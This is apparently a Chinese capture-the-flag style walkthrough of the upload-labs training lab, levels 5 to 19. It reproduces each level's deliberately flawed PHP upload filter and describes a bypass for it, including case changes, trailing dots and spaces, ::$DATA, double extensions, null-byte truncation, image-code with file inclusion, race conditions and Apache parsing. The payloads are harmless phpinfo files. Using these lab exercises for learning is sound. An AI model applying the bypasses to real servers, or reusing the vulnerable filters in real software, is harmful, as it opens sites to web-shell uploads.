id=\"Pass-05%EF%BC%88%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%E6%9C%AC%E6%9C%BA%E6%90%AD%E5%BB%BA%E7%9A%84Upload-labs%EF%BC%89\">Pass-05（建议使用本机搭建的Upload-labs）</h1>\n<p>upload-labs资源</p>\n<p>链接：https://pan.baidu.com/s/1uOM7sSAFusLk-973SkZlCw <br/> 提取码：ctyl </p>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}</code></pre>\n<h2>提示：</h2>\n<p>上传目录存在php文件（readme.php）</p>\n<h2>解题思路：</h2>\n<h3 id=\"%E5%85%88%E4%B8%8A%E4%BC%A0.user.ini\">先上传.user.ini</h3>\n<p>作用域是当前文件夹和当前文件夹中的子文件;包含指定的文件，显示在页面上</p>\n<p>.user.ini内容</p>\n<pre><code class=\"language-php\">Auto_prepend_file=phpinfo.jpg //在页面上部显示\n\nAuto_prepend_file=phpinfo.jpg //在页面底部部显示</code></pre>\n<h3 id=\"%E5%86%8D%E4%B8%8A%E4%BC%A0phpinfo.jpg\">再上传phpinfo.jpg</h3>\n<h3 id=\"%E6%9F%A5%E7%9C%8Breadme.php%E6%96%87%E4%BB%B6\">查看readme.php文件</h3>\n<p><img alt=\"\" height=\"767\" src=\"..\\..\\static\\image\\b83bc9c13aaf43d6a82b071c38f9cdfc.png\" width=\"1200\"/></p>\n<h1 id=\"Pass-06\">Pass-06</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n\n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}</code></pre>\n<h2>提示：</h2>\n<p>本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf|.htaccess后缀文件！</p>\n<h2>解题思路：</h2>\n<p>经过与第五关对比我们发现没有过滤大小写</p>\n<p>缺少代码</p>\n<pre><code> $file_ext = strtolower($file_ext); //转换为小写</code></pre>\n<p></p>\n<p>所以我们修改上传文件后缀名phpinfo.Php</p>\n<p>上传phpinfo.Php</p>\n<p>右键打开链接</p>\n<p></p>\n<p><img alt=\"\" height=\"835\" src=\"..\\..\\static\\image\\641056d19c254d9d80dbd69786dd85a0.png\" width=\"1200\"/></p>\n<h1 id=\"Pass-07\">Pass-07</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = $_FILES['upload_file']['name'];\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file,$img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件不允许上传';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}</code></pre>\n<p></p>\n<h2>提示：</h2>\n<p>没有进行首尾去空</p>\n<p>缺少代码</p>\n<pre><code>$file_ext = trim($file_ext); //首尾去空</code></pre>\n<p>我们可以进行空格绕过</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.php进行BP抓包</p>\n<p><img alt=\"\" height=\"339\" src=\"..\\..\\static\\image\\58ca660e6c294409864dea5f33e6a046.png\" width=\"614\"/></p>\n<p>上传成功后右键打开链接</p>\n<p><img alt=\"\" height=\"339\" src=\"..\\..\\static\\image\\ae75950a41f84166bc597f321bd0603f.png\" width=\"631\"/></p>\n<h1 id=\"Pass-08\">Pass-08</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n</code></pre>\n<h2>提示：</h2>\n<p>缺少代码</p>\n<pre><code class=\"language-php\"> $file_name = deldot($file_name)</code></pre>\n<p> 没有删除文件名末尾后的点</p>\n<p>所以进行点绕过</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.php文件进行BP抓包</p>\n<p><img alt=\"\" height=\"371\" src=\"..\\..\\static\\image\\d4c8012edb234ab38d43882f9b2bfd27.png\" width=\"621\"/></p>\n<p>上传成功后右键打开链接</p>\n<p><img alt=\"\" height=\"330\" src=\"..\\..\\static\\image\\8b8e76e0856d4bb8bac0bf0f21017487.png\" width=\"616\"/></p>\n<h1 id=\"Pass-09\">Pass-09</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}</code></pre>\n<h2>提示：</h2>\n<p>缺少代码</p>\n<pre><code>$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA</code></pre>\n<p>上传后缀名添加::$DATA</p>\n<p>::$DATA是一个流传输,可以把后面的数据当成流处理和.空格类似</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.php进行BP抓包，修改数据</p>\n<p><img alt=\"\" height=\"345\" src=\"..\\..\\static\\image\\07e40e5c390e4297bcd4c9b28babd993.png\" width=\"629\"/></p>\n<p>右键打开链接</p>\n<p><img alt=\"\" height=\"343\" src=\"..\\..\\static\\image\\b5e4eb2da464479bb7fbc7bc49e24d95.png\" width=\"639\"/></p>\n<p></p>\n<p>去掉URL中的::$DATA</p>\n<p><img alt=\"\" height=\"350\" src=\"..\\..\\static\\image\\a49d0c19d75046709f86f3a11c7751b8.png\" width=\"651\"/></p>\n<h1 id=\"Pass-10%C2%A0\">Pass-10 </h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\",\".ini\");\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = deldot($file_name);//删除文件名末尾的点\n        $file_ext = strrchr($file_name, '.');\n        $file_ext = strtolower($file_ext); //转换为小写\n        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA\n        $file_ext = trim($file_ext); //首尾去空\n        \n        if (!in_array($file_ext, $deny_ext)) {\n            $temp_file = $_FILES['upload_file']['tmp_name'];\n            $img_path = UPLOAD_PATH.'/'.$file_name;\n            if (move_uploaded_file($temp_file, $img_path)) {\n                $is_upload = true;\n            } else {\n                $msg = '上传出错！';\n            }\n        } else {\n            $msg = '此文件类型不允许上传！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n</code></pre>\n<h2 id=\"%C2%A0%E6%8F%90%E7%A4%BA%EF%BC%9A\"> 提示：</h2>\n<p>deldot()函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.php文件，BP抓包，修改数据</p>\n<p><img alt=\"\" height=\"371\" src=\"..\\..\\static\\image\\eda3c0e9894a47b2999acf7f410b4041.png\" width=\"628\"/></p>\n<p>上传完文件邮件打开链接</p>\n<p><img alt=\"\" height=\"338\" src=\"..\\..\\static\\image\\9421472350ea4fa5b543c2feec42e092.png\" width=\"629\"/></p>\n<h1 id=\"Pass-11\">Pass-11</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif (isset($_POST['submit'])) {\n    if (file_exists(UPLOAD_PATH)) {\n        $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\",\"ini\");\n\n        $file_name = trim($_FILES['upload_file']['name']);\n        $file_name = str_ireplace($deny_ext,\"\", $file_name);\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = UPLOAD_PATH.'/'.$file_name;        \n        if (move_uploaded_file($temp_file, $img_path)) {\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else {\n        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';\n    }\n}\n</code></pre>\n<h2>提示：</h2>\n<p>截取文件后缀名与上面禁用的后缀名匹配，如果想同，转化为空</p>\n<p>所有利用双写后缀名绕过</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.pphphp文件</p>\n<p>上传成功后右键打开链接</p>\n<p><img alt=\"\" height=\"595\" src=\"..\\..\\static\\image\\4dba95b2d46848b287de1faeffe4409d.png\" width=\"1200\"/></p>\n<h1 id=\"Pass-12\">Pass-12</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = '上传出错！';\n        }\n    } else{\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}</code></pre>\n<h2> 提示：</h2>\n<p>在处理数据时，当处理到00，就当作处理完成</p>\n<p>PHP版本小于5.3</p>\n<p>Magic_quotes_gpc=Off</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.jpg文件，用BP抓包修改数据</p>\n<p><img alt=\"\" height=\"337\" src=\"..\\..\\static\\image\\14502d82a6854269bd678cd23edac724.png\" width=\"621\"/></p>\n<p>上传成功后右键打开链接</p>\n<p><img alt=\"\" height=\"335\" src=\"..\\..\\static\\image\\ed54ac9ab3d84f46bd7398f45d58b424.png\" width=\"625\"/></p>\n<h1 id=\"Pass-13\">Pass-13</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $ext_arr = array('jpg','png','gif');\n    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1);\n    if(in_array($file_ext,$ext_arr)){\n        $temp_file = $_FILES['upload_file']['tmp_name'];\n        $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext;\n\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传失败\";\n        }\n    } else {\n        $msg = \"只允许上传.jpg|.png|.gif类型文件！\";\n    }\n}</code></pre>\n<h1>提示：</h1>\n<p>在处理数据时，当处理到00，就当作处理完成</p>\n<p>PHP版本小于5.3</p>\n<p>Magic_quotes_gpc=Off</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.jpg文件，用BP抓包修改数据</p>\n<p><img alt=\"\" height=\"400\" src=\"..\\..\\static\\image\\8b944b77efb64dcf91997af754d50443.png\" width=\"645\"/></p>\n<p>将空格(20)改成(00)进行截断</p>\n<p><img alt=\"\" height=\"348\" src=\"..\\..\\static\\image\\399ae5834782442781d523509023efc1.png\" width=\"646\"/></p>\n<p> 上传成功后右键打开链接</p>\n<p><img alt=\"\" height=\"349\" src=\"..\\..\\static\\image\\18a02e5e8d914f4e9ad713e80736673d.png\" width=\"650\"/></p>\n<h1 id=\"Pass-14\">Pass-14</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">function getReailFileType($filename){\n    $file = fopen($filename, \"rb\");\n    $bin = fread($file, 2); //只读2字节\n    fclose($file);\n    $strInfo = @unpack(\"C2chars\", $bin);    \n    $typeCode = intval($strInfo['chars1'].$strInfo['chars2']);    \n    $fileType = '';    \n    switch($typeCode){      \n        case 255216:            \n            $fileType = 'jpg';\n            break;\n        case 13780:            \n            $fileType = 'png';\n            break;        \n        case 7173:            \n            $fileType = 'gif';\n            break;\n        default:            \n            $fileType = 'unknown';\n        }    \n        return $fileType;\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $file_type = getReailFileType($temp_file);\n\n    if($file_type == 'unknown'){\n        $msg = \"文件未知，上传失败！\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }\n}\n</code></pre>\n<h2>提示： </h2>\n<p>Jpg格式图片的文件头标识：FFD8开头FFD9结尾</p>\n<p>Png格式图片的文件头标识：89 20 4E 47 0D 0A</p>\n<p>Gif格式图片的文件头标识：GIF89a GIF87a</p>\n<p>本关存在文件包含漏洞，Incould可以将被包含的文件当PHP代码执行</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.gif，BP抓包修改数据</p>\n<p><img alt=\"\" height=\"392\" src=\"..\\..\\static\\image\\e802b2920c874979bbd63016c1b00b76.png\" width=\"642\"/></p>\n<p>文件上传成功后右键打开链接</p>\n<p><img alt=\"\" height=\"348\" src=\"..\\..\\static\\image\\d03edd9f825f4ceb8bc9574a8719eed5.png\" width=\"650\"/></p>\n<h1 id=\"Pass-15-17\">Pass-15-17</h1>\n<p>15-17关都可以利用文件包含漏洞，上传图片码</p>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">function isImage($filename){\n    $types = '.jpeg|.png|.gif';\n    if(file_exists($filename)){\n        $info = getimagesize($filename);\n        $ext = image_type_to_extension($info[2]);\n        if(stripos($types,$ext)&gt;=0){\n            return $ext;\n        }else{\n            return false;\n        }\n    }else{\n        return false;\n    }\n}\n\n$is_upload = false;\n$msg = null;\nif(isset($_POST['submit'])){\n    $temp_file = $_FILES['upload_file']['tmp_name'];\n    $res = isImage($temp_file);\n    if(!$res){\n        $msg = \"文件未知，上传失败！\";\n    }else{\n        $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").$res;\n        if(move_uploaded_file($temp_file,$img_path)){\n            $is_upload = true;\n        } else {\n            $msg = \"上传出错！\";\n        }\n    }\n}</code></pre>\n<h2>提示：</h2>\n<p>利用文件包含漏洞上传图片码</p>\n<h2>解题思路：</h2>\n<p>制作图片码</p>\n<p><img alt=\"\" height=\"95\" src=\"..\\..\\static\\image\\2fb8e2deb42a433295d0d366f838d763.png\" width=\"554\"/></p>\n<p>上传生成的888.jpg图片码</p>\n<p>上传成功后右键打开链接</p>\n<p><img alt=\"\" height=\"338\" src=\"..\\..\\static\\image\\baf83855b4d749809e0646898270cb92.png\" width=\"629\"/></p>\n<h1 id=\"Pass-18\">Pass-18</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">//index.php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit']))\n{\n    require_once(\"./myupload.php\");\n    $imgFileName =time();\n    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);\n    $status_code = $u-&gt;upload(UPLOAD_PATH);\n    switch ($status_code) {\n        case 1:\n            $is_upload = true;\n            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;\n            break;\n        case 2:\n            $msg = '文件已经被上传，但没有重命名。';\n            break; \n        case -1:\n            $msg = '这个文件不能上传到服务器的临时文件存储目录。';\n            break; \n        case -2:\n            $msg = '上传失败，上传目录不可写。';\n            break; \n        case -3:\n            $msg = '上传失败，无法上传该类型文件。';\n            break; \n        case -4:\n            $msg = '上传失败，上传的文件过大。';\n            break; \n        case -5:\n            $msg = '上传失败，服务器已经存在相同名称文件。';\n            break; \n        case -6:\n            $msg = '文件无法上传，文件不能复制到目标目录。';\n            break;      \n        default:\n            $msg = '未知错误！';\n            break;\n    }\n}\n\n//myupload.php\nclass MyUpload{\n......\n......\n...... \n  var $cls_arr_ext_accepted = array(\n      \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\",\n      \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );\n\n......\n......\n......  \n  /** upload()\n   **\n   ** Method to upload the file.\n   ** This is the only method to call outside the class.\n   ** @para String name of directory we upload to\n   ** @returns void\n  **/\n  function upload( $dir ){\n    \n    $ret = $this-&gt;isUploadedFile();\n    \n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );\n    }\n\n    $ret = $this-&gt;setDir( $dir );\n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );\n    }\n\n    $ret = $this-&gt;checkExtension();\n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );\n    }\n\n    $ret = $this-&gt;checkSize();\n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );    \n    }\n    \n    // if flag to check if the file exists is set to 1\n    \n    if( $this-&gt;cls_file_exists == 1 ){\n      \n      $ret = $this-&gt;checkFileExists();\n      if( $ret != 1 ){\n        return $this-&gt;resultUpload( $ret );    \n      }\n    }\n\n    // if we are here, we are ready to move the file to destination\n\n    $ret = $this-&gt;move();\n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );    \n    }\n\n    // check if we need to rename the file\n\n    if( $this-&gt;cls_rename_file == 1 ){\n      $ret = $this-&gt;renameFile();\n      if( $ret != 1 ){\n        return $this-&gt;resultUpload( $ret );    \n      }\n    }\n    \n    // if we are here, everything worked as planned :)\n\n    return $this-&gt;resultUpload( \"SUCCESS\" );\n  \n  }\n......\n......\n...... \n};</code></pre>\n<h2>提示：</h2>\n<p>上传文件后会判断后缀名，如果相同会进行重命名。我们可以进行条件竞争</p>\n<h2>解题思路：</h2>\n<p>上传文件，进行BP爆破</p>\n<p><img alt=\"\" height=\"490\" src=\"..\\..\\static\\image\\e5d4a7fb52cd4364acb8f9e6c59507a1.png\" width=\"649\"/></p>\n<p><img alt=\"\" height=\"489\" src=\"..\\..\\static\\image\\41373f62e55a4dee9c61ad9e8856a8fb.png\" width=\"647\"/></p>\n<p>出现上传的php文件但很快就消失了</p>\n<p><img alt=\"\" height=\"422\" src=\"..\\..\\static\\image\\fa34d3750ea24ab69e8dd4a6d8f9c7e7.png\" width=\"640\"/></p>\n<p><img alt=\"\" height=\"432\" src=\"..\\..\\static\\image\\90e5d344c2bf42209068817fd74f04e6.png\" width=\"644\"/></p>\n<h1 id=\"Pass-19\">Pass-19</h1>\n<h2>代码：</h2>\n<pre><code class=\"language-php\">//index.php\n$is_upload = false;\n$msg = null;\nif (isset($_POST['submit']))\n{\n    require_once(\"./myupload.php\");\n    $imgFileName =time();\n    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);\n    $status_code = $u-&gt;upload(UPLOAD_PATH);\n    switch ($status_code) {\n        case 1:\n            $is_upload = true;\n            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;\n            break;\n        case 2:\n            $msg = '文件已经被上传，但没有重命名。';\n            break; \n        case -1:\n            $msg = '这个文件不能上传到服务器的临时文件存储目录。';\n            break; \n        case -2:\n            $msg = '上传失败，上传目录不可写。';\n            break; \n        case -3:\n            $msg = '上传失败，无法上传该类型文件。';\n            break; \n        case -4:\n            $msg = '上传失败，上传的文件过大。';\n            break; \n        case -5:\n            $msg = '上传失败，服务器已经存在相同名称文件。';\n            break; \n        case -6:\n            $msg = '文件无法上传，文件不能复制到目标目录。';\n            break;      \n        default:\n            $msg = '未知错误！';\n            break;\n    }\n}\n\n//myupload.php\nclass MyUpload{\n......\n......\n...... \n  var $cls_arr_ext_accepted = array(\n      \".doc\", \".xls\", \".txt\", \".pdf\", \".gif\", \".jpg\", \".zip\", \".rar\", \".7z\",\".ppt\",\n      \".html\", \".xml\", \".tiff\", \".jpeg\", \".png\" );\n\n......\n......\n......  \n  /** upload()\n   **\n   ** Method to upload the file.\n   ** This is the only method to call outside the class.\n   ** @para String name of directory we upload to\n   ** @returns void\n  **/\n  function upload( $dir ){\n    \n    $ret = $this-&gt;isUploadedFile();\n    \n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );\n    }\n\n    $ret = $this-&gt;setDir( $dir );\n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );\n    }\n\n    $ret = $this-&gt;checkExtension();\n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );\n    }\n\n    $ret = $this-&gt;checkSize();\n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );    \n    }\n    \n    // if flag to check if the file exists is set to 1\n    \n    if( $this-&gt;cls_file_exists == 1 ){\n      \n      $ret = $this-&gt;checkFileExists();\n      if( $ret != 1 ){\n        return $this-&gt;resultUpload( $ret );    \n      }\n    }\n\n    // if we are here, we are ready to move the file to destination\n\n    $ret = $this-&gt;move();\n    if( $ret != 1 ){\n      return $this-&gt;resultUpload( $ret );    \n    }\n\n    // check if we need to rename the file\n\n    if( $this-&gt;cls_rename_file == 1 ){\n      $ret = $this-&gt;renameFile();\n      if( $ret != 1 ){\n        return $this-&gt;resultUpload( $ret );    \n      }\n    }\n    \n    // if we are here, everything worked as planned :)\n\n    return $this-&gt;resultUpload( \"SUCCESS\" );\n  \n  }\n......\n......\n...... \n};</code></pre>\n<h2>提示：</h2>\n<p>上传文件后，判断后缀名，移动文件进行重命名</p>\n<p>Apache解析漏洞</p>\n<p>1.php.zxc.zxc.zxc.zxc.zxc</p>\n<p>Apache从右往左解析，解析不了继续解析下一个</p>\n<p>上传phpinfo.php.7z</p>\n<h2>解题思路：</h2>\n<p>上传phpinfo.php.7z进行BP爆破</p>\n<p><img 